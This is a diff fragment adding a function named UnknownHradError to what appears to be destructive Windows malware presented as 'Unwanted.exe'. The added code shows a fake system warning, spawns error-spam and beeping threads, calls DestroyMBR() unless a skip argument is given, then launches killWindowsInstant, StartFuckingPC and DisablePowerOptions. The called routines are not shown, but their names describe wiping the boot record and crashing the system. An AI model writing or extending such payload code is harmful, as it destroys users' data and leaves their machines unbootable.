@@ -1176,3 +1176,33 @@ int beepsandlights() {
         return 0;
     }
 }
+
+// Addition of UHE void function to fix the madness of redundance
+void UnknownHradError() {
+    CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
+    int DisplayResourceNAMessageBox();
+    {
+        int msgboxID = MessageBox(
+            NULL,
+            (LPCWSTR)L"Unknown hard error",
+            (LPCWSTR)L"Unwanted.exe - System Warning",
+            MB_ICONWARNING | MB_OK
+        );
+    };
+    int argc;
+    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
+    if (not(argc > 1 
+        && !lstrcmpW(argv[1], L"skipdestroymbr")
+        || !lstrcmpW(argv[1], L"nomainpayload")
+        )) DestroyMBR();
+
+    CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
+    CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
+    Sleep(200);
+    CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
+
+    Sleep(992);
+
+    StartFuckingPC();
+    DisablePowerOptions();
+}
